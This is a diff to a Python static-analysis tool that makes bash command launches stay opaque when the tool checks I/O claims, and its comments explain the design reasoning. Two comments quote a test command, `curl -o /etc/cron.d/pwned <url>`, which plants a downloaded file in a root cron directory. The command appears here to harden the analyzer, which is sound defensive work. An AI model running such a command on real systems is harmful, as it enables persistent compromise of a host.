@@ -74,6 +74,7 @@ import yaml
 from .edge_types import is_grpc_rpc_implementation
 from .io_boundary import (
     KNOWN_IO_BOUNDARIES,
+    PRODUCER_OPAQUE_BOUNDARIES,
     BoundaryMap,
     IoBoundaryCatalog,
     classify_call,
@@ -958,6 +959,30 @@ def _external_call_sites(
         yield edge, dst, catalog
 
 
+def _launch_site_name(edge: dict[str, Any], dst: str) -> str:
+    """``module.name`` for a launch, spelled the way the catalogue branch spells it.
+
+    Both branches of :func:`_opaque_launch_sites` feed one disclosure string, so
+    they have to agree: the catalogue branch joins ``primitive.module`` and
+    ``primitive.name``, and a bash launch of ``curl`` reads ``curl.curl`` from
+    either side.
+
+    ``dst_ref`` IS PREFERRED FOR THE SAME REASON :func:`_edge_dst_ref` EXISTS —
+    WI-tihup put a structured target beside the colon-packed id and the tagger
+    reads it, so a gate reading the slots instead is how the two come to
+    disagree about what a call names. The slot fallback is not defensive
+    padding: only bash stamps a boundary today and it always sets ``dst_ref``,
+    but the stamp is a producer contract that the next producer to adopt it may
+    satisfy without one, and a five-slot id is guaranteed here because
+    :func:`_external_call_sites` already rejected anything shorter.
+    """
+    ref = _edge_dst_ref(edge)
+    if ref is not None:
+        return ".".join(part for part in (ref.module_path, ref.name) if part)
+    parts = dst.split(":")
+    return ".".join(part for part in (parts[1], parts[3]) if part)
+
+
 def _opaque_launch_sites(
     raw_edges: list[dict[str, Any]],
     catalogs: dict[str, IoBoundaryCatalog],
@@ -977,6 +1002,25 @@ def _opaque_launch_sites(
     ``must_not_exist`` claim, with ``open(f, "w")`` and ``socket.send`` controls
     returning ``violated`` rc 1 in the same session.
 
+    TWO CHANNELS, ONE QUESTION (INV-larol). A catalogue is not the only thing
+    that knows a call is a launch. The bash analyzer stamps
+    ``meta.io_boundary = "command_launch"`` on an external-command edge because
+    there is no bash catalogue to match against and ADR-0016 rules one out, so
+    that stamp is the ONLY evidence of opacity those edges will ever carry.
+    Consulting the catalogue alone left it unread. The producer stamp is
+    therefore checked FIRST, before ``classify_call``: a catalogue row can
+    classify a launch without describing it — ``curl -> net_send`` is right
+    about the send and silent about the ``-o`` file write — and matching it is
+    exactly what made the call an examined negative for every other boundary.
+
+    Measured on the shipped CLI over a two-line script whose only command is
+    ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
+    filesystem": with no ``bash.yaml``, ``inconclusive`` rc 2; with six lines of
+    ``curl -> net_send`` ``bash.yaml``, ``confirmed`` rc 0. Declaring
+    ``subprocess`` alongside restored the refusal, which is the control showing
+    the row matched and the BOUNDARY CHOICE — not the analyzer's sight —
+    decided the verdict.
+
     Returns the QUALIFIED PRIMITIVE NAMES (``subprocess.run``), not the modules.
     A module name would be actively misleading here: the blocker is not that
     ``subprocess`` is uncatalogued — it is fully catalogued — but that this
@@ -985,6 +1029,17 @@ def _opaque_launch_sites(
     """
     sites: set[str] = set()
     for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
+        # THE PRODUCER CHANNEL, CHECKED BEFORE ``classify_call`` (INV-larol).
+        # A catalogue row can CLASSIFY a launch without DESCRIBING it: a
+        # ``curl -> net_send`` row is right about the send and silent about the
+        # ``-o`` file write, and matching it is exactly what made the call an
+        # examined negative for every other boundary. Asking the producer first
+        # means a launch keeps its opacity no matter what a catalogue later
+        # says about it, which is the difference between opacity being
+        # structural and opacity being a favour the catalogue chooses to do.
+        if (edge.get("meta") or {}).get("io_boundary") in PRODUCER_OPAQUE_BOUNDARIES:
+            sites.add(_launch_site_name(edge, dst))
+            continue
         primitive = classify_call(
             catalogs, dst, edge.get("meta"), dst_ref=_edge_dst_ref(edge),
         )
@@ -1279,8 +1334,23 @@ def compute_boundary_coverage(
     # cost is disclosed rather than hidden: `bash` is universal on that
     # cohort, so until an io_primitives/bash.yaml exists this downgrades most
     # real repos to `inconclusive` — which is the correct answer for a tool
-    # that cannot see what a shell script does, and is why the catalogue is
-    # the follow-up rather than a scope exclusion here.
+    # that cannot see what a shell script does.
+    #
+    # THIS COMMENT USED TO END "and is why the catalogue is the follow-up
+    # rather than a scope exclusion here." That was WRONG, and wrong in the
+    # dangerous direction, so it is corrected rather than left standing
+    # (INV-larol). ADR-0016's implementation note rules a bash data-I/O
+    # catalogue out — cataloguing `curl` as `net_send` attributes curl's
+    # network activity to the shell script, and no clean invariant separates
+    # `curl` from `git`. Measured on the shipped CLI, a two-line script whose
+    # only command is `curl -o /etc/cron.d/pwned <url>`, claim "never writes to
+    # the host filesystem": with no bash.yaml, `inconclusive` rc 2; with six
+    # lines of `curl -> net_send` bash.yaml, `confirmed` rc 0. The row is
+    # correct and the verdict it buys is a green tick over a write into a root
+    # cron directory, because classifying a launch used to strip its opacity.
+    # `_opaque_launch_sites` now consults the producer stamp, so a launch stays
+    # opaque whatever a catalogue says — the follow-up this comment should have
+    # named, and the one that makes any bash catalogue safe to consider.
     uncatalogued = sorted(languages_with_calls - set(catalogs))
     if uncatalogued:
         return BoundaryCoverage(
